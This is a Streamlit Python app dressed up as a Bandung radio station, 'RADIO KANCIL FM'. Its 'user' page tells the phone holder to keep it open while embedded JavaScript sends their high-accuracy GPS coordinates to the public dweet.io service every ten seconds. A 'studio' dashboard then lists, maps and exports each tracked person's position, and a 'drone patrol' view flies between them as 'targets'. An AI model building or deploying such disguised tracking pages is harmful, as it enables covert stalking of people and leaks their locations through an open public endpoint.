import streamlit as st
import pandas as pd
import os
import requests
import urllib.parse
import streamlit.components.v1 as components

st.set_page_config(page_title="RADIO KANCIL FM - STUDIO FM", layout="wide")
PERSONIL_FILE = "personil.csv"

def load_personil():
    if not os.path.exists(PERSONIL_FILE):
        return pd.DataFrame(columns=["nama","merk"])
    try:
        return pd.read_csv(PERSONIL_FILE)
    except:
        return pd.DataFrame(columns=["nama","merk"])

def get_posisi(nama):
    kode = "mata-elang-" + nama.lower().replace(" ", "-")
    try:
        r = requests.get(f"https://dweet.io/get/latest/dweet/for/{kode}", timeout=5)
        j = r.json()
        if j.get("this") == "succeeded":
            return j["with"][0]["content"]
    except:
        pass
    return None

params = st.query_params
mode = params.get("mode", "")

if mode == "":
    st.title("📻 RADIO KANCIL FM - Bandung")
    if st.button("MASUK SEBAGAI STUDIO FM (LAPTOP)", type="primary", use_container_width=True):
        st.query_params["mode"] = "studio"
        st.rerun()
    st.stop()

# === HP - OJO DIUBAH ===
if mode == "user":
    nama = params.get("nama", "HP-TANPA-NAMA")
    merk = params.get("merk", "HP")
    kode = "mata-elang-" + nama.lower().replace(" ", "-")
    st.title(f"📻 RADIO KANCIL FM - {nama}")
    st.success(f"Halo {nama} | Merk: {merk}")
    st.write("Biarin halaman ini nyala, GPS jalan sendiri.")
    html = f"""
    <div id="s" style="padding:15px;background:#e8f5e9;border-radius:10px;font-family:sans-serif;">📍 GPS: Mencari...</div>
    <script>
    const kode = "{kode}";
    function kirim(lat, lon) {{
        document.getElementById('s').innerHTML = "✅ GPS AKTIF<br>Lat: "+lat+"<br>Lon: "+lon+"<br>Mengirim...";
        fetch("https://dweet.io/dweet/for/"+kode+"?lat="+lat+"&lon="+lon+"&nama="+encodeURIComponent("{nama}")+"&update="+new Date().toLocaleTimeString())
        .then(()=>{{ document.getElementById('s').innerHTML = "✅ GPS AKTIF<br>Lat: "+lat+"<br>Lon: "+lon+"<br>📍 TERKIRIM KE STUDIO FM! "+new Date().toLocaleTimeString(); }});
    }}
    setInterval(()=>{{ navigator.geolocation.getCurrentPosition((p)=>{{ kirim(p.coords.latitude, p.coords.longitude); }}); }}, 10000);
    navigator.geolocation.getCurrentPosition((p)=>{{ kirim(p.coords.latitude, p.coords.longitude); }},
    (e)=>{{ document.getElementById('s').innerHTML = "❌ GPS DITOLAK! Klik gembok, izinkan Lokasi."; }}, {{enableHighAccuracy:true}});
    </script>
    """
    components.html(html, height=130)
    st.stop()

# === STUDIO FM - PERSIS FOTO MU, MUNG GANTI JENENG ===
if mode == "studio":
    # INI SING NANG FOTO MU - TAK GANTI JENENG TOK
    st.title("🦅 RADIO KANCIL FM - STUDIO FM")

    # Tombol 4 persis foto
    c1, c2, c3, c4 = st.columns(4)
    with c1:
        if st.button("🔄 REFRESH", use_container_width=True):
            st.rerun()
    with c2:
        if st.button("🔍 ZOOM MAKSIMAL", use_container_width=True):
            st.session_state["zoom"] = 16
            st.rerun()
    with c3:
        if st.button("🗑️ KELUARKAN SEMUA", use_container_width=True):
            if os.path.exists(PERSONIL_FILE):
                os.remove(PERSONIL_FILE)
            st.rerun()
    with c4:
        if st.button("🔗 BUAT LINK BARU (RESET)", use_container_width=True):
            st.rerun()

    # Hitung Online / Di-kick - persis foto
    dfp = load_personil()
    online = 0
    for _, p in dfp.iterrows():
        if get_posisi(p["nama"]):
            online += 1
    dikick = st.session_state.get("dikick", 0)
    zoom = st.session_state.get("zoom", 16)

    st.info(f"Online: {online} | Di-kick: {dikick} | Zoom: MAKSIMAL {zoom}")

    st.subheader("📋 DAFTAR - KELUARKAN TEKO LAPTOP")
    if dfp.empty:
        st.write("Belum ada Sobat Kancil.")
    else:
        all_pos = []
        for _, p in dfp.iterrows():
            data = get_posisi(p["nama"])
            if data:
                try:
                    lat = float(data.get('lat')); lon = float(data.get('lon'))
                    all_pos.append({"nama":p["nama"],"lat":lat,"lon":lon,"update":data.get('update')})
                    st.success(f"🟢 {p['nama']} | ONLINE | {lat}, {lon} | {data.get('update')}")
                    col1, col2, col3 = st.columns(3)
                    with col1:
                        st.link_button(f"🛰️ SATELIT {p['nama']}", f"https://www.google.com/maps/@?api=1&map_action=map&center={lat},{lon}&zoom=19&basemap=satellite")
                    with col2:
                        st.link_button(f"🌍 GOOGLE EARTH {p['nama']}", f"https://earth.google.com/web/@{lat},{lon},500a,500d,35y,0h,0t,0r")
                    with col3:
                        st.link_button(f"🗺️ MAPS BIASA", f"https://www.google.com/maps?q={lat},{lon}")
                except:
                    st.error(f"🔴 {p['nama']} | Data GPS Rusak")
            else:
                st.error(f"🔴 {p['nama']} - {p['merk']} | OFFLINE")

            # Tombol Keluarkan per orang - persis foto: KELUARKAN TEKO LAPTOP
            if st.button(f"👢 KELUARKAN {p['nama']}", key=f"kick_{p['nama']}"):
                dfp2 = dfp[dfp["nama"] != p["nama"]]
                dfp2.to_csv(PERSONIL_FILE, index=False)
                st.session_state["dikick"] = dikick + 1
                st.rerun()

            try:
                host = st.context.headers.get("host", "radio-kancil-fm.streamlit.app")
                base = f"https://{host}"
            except:
                base = "https://radio-kancil-fm.streamlit.app"
            link = f"{base}/?mode=user&nama={urllib.parse.quote(p['nama'])}&merk={urllib.parse.quote(p['merk'])}"
            st.code(link, language="text")
            st.markdown("---")

        if all_pos:
            st.subheader("🛰️ PETA SATELIT - SEMUA SOBAT KANCIL")
            st.map(pd.DataFrame(all_pos), latitude="lat", longitude="lon", size=20, color="#FF0000")
            kml = '<?xml version="1.0" encoding="UTF-8"?><kml xmlns="http://www.opengis.net/kml/2.2"><Document><name>RADIO KANCIL FM</name>'
            for pos in all_pos:
                kml += f"<Placemark><name>{pos['nama']}</name><description>Update: {pos['update']}</description><Point><coordinates>{pos['lon']},{pos['lat']},0</coordinates></Point></Placemark>"
            kml += '</Document></kml>'
            st.download_button("📥 DOWNLOAD KML BUAT GOOGLE EARTH PRO", data=kml, file_name="radio_kancil.kml", mime="application/vnd.google-earth.kml+xml", use_container_width=True)

    st.markdown("---")
    # Persis foto ngisor dewe
    st.markdown("🚁 [MODE DRONE CINEMATIC 3D - ZOOM 16](?mode=drone)")
    st.code("Link HP: https://radio-kancil-fm.streamlit.app/?mode=user", language="text")

if mode == "drone":
    st.title("🦅 RADIO KANCIL FM - DRONE CINEMATIC 3D")
    st.write("Diemin 10 detik biar peta ke-load!")
    if st.button("⬅️ Balik ke STUDIO FM"):
        st.query_params["mode"] = "studio"
        st.rerun()
    dfp = load_personil()
    all_pos = []
    for _, p in dfp.iterrows():
        d = get_posisi(p["nama"])
        if d:
            try: all_pos.append({"nama":p["nama"],"lat":float(d.get('lat')),"lon":float(d.get('lon'))})
            except: pass
    if not all_pos:
        st.warning("Durung ono sing ONLINE.")
        st.stop()
    import json as _json
    pos_json = _json.dumps(all_pos)
    html_drone = f"""
    <div style="position:relative; width:100%; height:600px;">
      <div id="map" style="width:100%; height:600px; border-radius:12px;"></div>
      <div id="hud" style="position:absolute; top:10px; left:10px; background:rgba(0,0,0,0.75); color:white; padding:10px 12px; border-radius:8px; font-family:monospace; font-size:12px; z-index:1000;">DRONE: SIAP<br>TARGET: {len(all_pos)} CHECKPOINT</div>
      <div style="position:absolute; bottom:55px; left:50%; transform:translateX(-50%); z-index:1000;"><button onclick="mulaiPatroli()" style="background:#FF2D55; color:white; border:none; padding:12px 28px; border-radius:25px; font-weight:bold; font-size:16px;">🎥 MULAI PATROLI DRONE</button></div>
      <div style="position:absolute; bottom:12px; left:10px; right:10px; display:flex; gap:8px; z-index:1000; flex-wrap:wrap;">{''.join([f'<button onclick="terbangKe({i})" style="background:#111; color:#00FF66; border:1px solid #00FF66; padding:8px 14px; border-radius:20px; font-weight:bold;">📍 {p["nama"]} - TERBANG KE SINI</button>' for i,p in enumerate(all_pos)])}</div>
    </div>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
    var data = {pos_json}; var map = L.map('map').setView([-6.9175, 107.6191], 6);
    L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{{z}}/{{y}}/{{x}}').addTo(map);
    var markers=[]; data.forEach(function(p){{ markers.push(L.marker([p.lat, p.lon]).addTo(map).bindPopup("<b>"+p.nama+"</b>")); }});
    var drone = L.marker([-6.9175, 107.6191], {{icon: L.divIcon({{html:'<div style="font-size:28px;">⊕</div>', iconSize:[30,30]}})}}).addTo(map);
    function setHUD(t){{ document.getElementById('hud').innerHTML=t; }}
    function animateTo(lat, lon, zoom, done){{ var s=map.getCenter(); var sz=map.getZoom(); var steps=60; var i=0; var iv=setInterval(function(){{ i++; var f=i/steps; map.setView([s.lat+(lat-s.lat)*f, s.lng+(lon-s.lng)*f], sz+(zoom-sz)*f); drone.setLatLng([s.lat+(lat-s.lat)*f, s.lng+(lon-s.lng)*f]); if(i>=steps){{ clearInterval(iv); if(done) done(); }} }},30); }}
    function terbangKe(i){{ var p=data[i]; setHUD("DRONE: TERBANG...<br>TARGET: "+p.nama); animateTo(p.lat,p.lon,16,function(){{ setHUD("DRONE: HOVER - MEMANTAU<br>CHECKPOINT: "+p.nama+"<br>STATUS: STABIL..."); markers[i].openPopup(); }}); }}
    var idx=0, jalan=false; function mulaiPatroli(){{ if(jalan) return; jalan=true; idx=0; next(); }} function next(){{ if(idx>=data.length){{ setHUD("DRONE: PATROLI SELESAI"); jalan=false; return; }} var p=data[idx]; setHUD("DRONE: TERBANG...<br>TARGET "+(idx+1)+"/"+data.length+": "+p.nama); animateTo(p.lat,p.lon,16,function(){{ setHUD("DRONE: HOVER - MEMANTAU<br>CHECKPOINT: "+p.nama); setTimeout(function(){{ idx++; next(); }},2500); }}); }}
    </script>
    """
    components.html(html_drone, height=680)
